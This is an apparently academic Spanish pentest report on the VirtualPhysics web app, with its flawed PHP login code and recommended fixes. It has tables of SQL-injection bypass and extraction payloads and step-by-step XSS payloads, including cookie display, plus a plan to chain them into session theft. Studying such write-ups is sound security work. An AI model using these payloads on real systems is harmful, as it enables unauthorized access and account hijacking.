# Guía de Vulnerabilidades en VirtualPhysics
## Informe de Pentesting para Fines Académicos

Este documento detalla las vulnerabilidades encontradas en el sistema VirtualPhysics y cómo explotarlas con fines educativos y de pentesting. El análisis se centra en dos tipos principales de vulnerabilidades: Inyección SQL (SQLi) y Cross-Site Scripting (XSS).

## 1. Inyección SQL (SQLi)

### 1.1 Descripción de la Vulnerabilidad

La inyección SQL es una técnica de ataque que aprovecha la falta de validación en las entradas de usuario que se utilizan para construir consultas SQL. En VirtualPhysics, esta vulnerabilidad está presente en el proceso de autenticación (`procesar_login.php`), donde los datos del formulario de inicio de sesión se concatenan directamente en la consulta SQL sin ningún tipo de saneamiento.

### 1.2 Código Vulnerable

```php
// Archivo: procesar_login.php
$correo = $_POST['correo'];
$contrasena = $_POST['contrasena'];

// Consulta vulnerable a inyección SQL
$query = "SELECT * FROM usuarios WHERE (correo = '$correo') AND (contrasena = SHA2('$contrasena', 256))";

$resultado = mysqli_query($conexion, $query);
```

### 1.3 Explotación de la Vulnerabilidad

#### 1.3.1 Bypass de Autenticación

Para explotar esta vulnerabilidad y acceder al sistema sin conocer credenciales válidas, puedes usar los siguientes payloads en el campo de correo:

| Payload | Descripción |
|---------|-------------|
| `' OR 1=1) -- ` | Hace que la condición WHERE siempre sea verdadera |
| `') OR ('1'='1') -- ` | Cierra el paréntesis y crea una condición siempre verdadera |
| `') OR 1=1 -- ` | Variante más simple que también funciona |

Cuando ingresas `' OR 1=1) -- ` en el campo de correo, la consulta resultante es:

```sql
SELECT * FROM usuarios WHERE (correo = '' OR 1=1) -- ') AND (contrasena = SHA2('cualquier_cosa', 256))
```

Todo lo que sigue después de `--` se considera un comentario en SQL, por lo que la parte de la validación de contraseña se ignora completamente.

#### 1.3.2 Acceso como Usuario Específico

Si deseas acceder como un usuario específico, puedes usar:

| Payload | Descripción |
|---------|-------------|
| `') OR correo='admin@virtualphysics.com') -- ` | Accede como administrador |
| `') OR correo='izi@gmail.com') -- ` | Accede como usuario "izai" |
| `') OR codigo='admin-001') -- ` | Accede usando el código de usuario |

#### 1.3.3 Extracción de Información

Para extraer información de la base de datos:

| Payload | Descripción |
|---------|-------------|
| `') UNION SELECT 'admin-001','Admin','admin@test.com','test',NOW() -- ` | Crea un registro falso |
| `') OR 1=1 ORDER BY 1,2,3,4,5 -- ` | Determina el número de columnas |

#### 1.3.4 Inyecciones Basadas en Errores

Para obtener información a través de errores:

| Payload | Descripción |
|---------|-------------|
| `') AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- ` | Extrae la versión de la base de datos |

### 1.4 Evidencia de Explotación

1. Ingresa al formulario de login en `index.php`
2. En el campo de correo, escribe: `' OR 1=1) -- `
3. En el campo de contraseña, escribe cualquier cosa (por ejemplo: `123`)
4. Haz clic en "INGRESAR"
5. Serás redirigido a `dashboard.php` como el primer usuario de la base de datos

### 1.5 Mitigación

Para mitigar esta vulnerabilidad:

1. **Usar consultas preparadas (prepared statements)**:
```php
$stmt = $conexion->prepare("SELECT * FROM usuarios WHERE correo = ? AND contrasena = SHA2(?, 256)");
$stmt->bind_param("ss", $correo, $contrasena);
$stmt->execute();
$resultado = $stmt->get_result();
```

2. **Validar y sanitizar entradas**:
```php
$correo = filter_var($_POST['correo'], FILTER_SANITIZE_EMAIL);
if (!filter_var($correo, FILTER_VALIDATE_EMAIL)) {
    // Manejar error
}
```

3. **Implementar un ORM (Object-Relational Mapping)** como Doctrine o Eloquent.

## 2. Cross-Site Scripting (XSS)

### 2.1 Descripción de la Vulnerabilidad

El Cross-Site Scripting (XSS) permite a un atacante inyectar scripts maliciosos en páginas web vistas por otros usuarios. En VirtualPhysics, existen múltiples puntos donde las entradas de usuario se muestran sin escapar adecuadamente.

### 2.2 Tipos de XSS en VirtualPhysics

#### 2.2.1 XSS Reflejado (Reflected XSS)

En `procesar_login.php`, cuando las credenciales son incorrectas, el correo ingresado se refleja en el mensaje de error sin escapar:

```php
$error_msg = "Credenciales incorrectas para el correo: " . $correo;
header("Location: index.php?error=" . $error_msg);
```

Y en `index.php`, el mensaje de error se muestra directamente:

```php
<?php if(isset($_GET['error'])): ?>
    <div class="error-message"><?php echo $_GET['error']; ?></div>
<?php endif; ?>
```

#### 2.2.2 XSS Almacenado (Stored XSS)

En `dashboard.php`, el nombre de usuario se obtiene de la sesión y se muestra directamente:

```php
<span>Bienvenido, <?php echo $_SESSION['usuario_nombre']; ?></span>
```

Si un atacante logra modificar el nombre de usuario en la base de datos para incluir código malicioso, este se ejecutará cada vez que el usuario inicie sesión.

### 2.3 Explotación de la Vulnerabilidad

#### 2.3.1 XSS Reflejado

Para explotar el XSS reflejado:

1. Accede al formulario de login en `index.php`
2. En el campo de correo, ingresa: `<script>alert('XSS')</script>`
3. En el campo de contraseña, ingresa cualquier cosa
4. Haz clic en "INGRESAR"
5. Serás redirigido a `index.php` con un mensaje de error que ejecutará el script

Otros payloads efectivos:

| Payload | Descripción |
|---------|-------------|
| `<img src="x" onerror="alert('XSS')">` | Ejecuta código cuando la imagen no se puede cargar |
| `<svg onload="alert('XSS')">` | Ejecuta código cuando el SVG se carga |
| `javascript:alert('XSS')` | Inyección en atributos href |

#### 2.3.2 XSS Almacenado

Para explotar el XSS almacenado, necesitarías:

1. Acceder a la base de datos (posiblemente a través de otra vulnerabilidad como SQLi)
2. Modificar el campo `nombre` de un usuario para incluir código malicioso
3. Cuando ese usuario inicie sesión, el código se ejecutará

### 2.4 Evidencia de Explotación

Para el XSS reflejado:
1. Ingresa `<script>alert(document.cookie)</script>` en el campo de correo
2. Ingresa cualquier contraseña
3. Haz clic en "INGRESAR"
4. Verás una alerta con las cookies de la sesión

### 2.5 Mitigación

Para mitigar vulnerabilidades XSS:

1. **Escapar salidas HTML**:
```php
<span>Bienvenido, <?php echo htmlspecialchars($_SESSION['usuario_nombre'], ENT_QUOTES, 'UTF-8'); ?></span>
```

2. **Usar funciones de escape en mensajes de error**:
```php
<?php if(isset($_GET['error'])): ?>
    <div class="error-message"><?php echo htmlspecialchars($_GET['error'], ENT_QUOTES, 'UTF-8'); ?></div>
<?php endif; ?>
```

3. **Implementar Content Security Policy (CSP)**:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

4. **Validar entradas** para rechazar caracteres sospechosos.

## 3. Combinación de Vulnerabilidades

Un atacante podría combinar ambas vulnerabilidades para un ataque más sofisticado:

1. Usar SQLi para acceder al sistema sin credenciales
2. Explotar XSS para robar cookies de sesión de otros usuarios
3. Usar las cookies robadas para suplantar a esos usuarios

## 4. Conclusiones

Las vulnerabilidades encontradas en VirtualPhysics son graves y podrían permitir a un atacante:

- Acceder al sistema sin credenciales válidas
- Obtener información sensible de la base de datos
- Ejecutar código malicioso en el navegador de las víctimas
- Robar sesiones de usuarios

Es fundamental implementar las medidas de mitigación mencionadas para proteger el sistema y los datos de los usuarios.

## 5. Referencias

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MySQL Documentation on Prepared Statements](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)

---

*Este documento ha sido creado con fines educativos y de pentesting en un entorno controlado. No utilices estas técnicas en sistemas reales sin autorización explícita.*
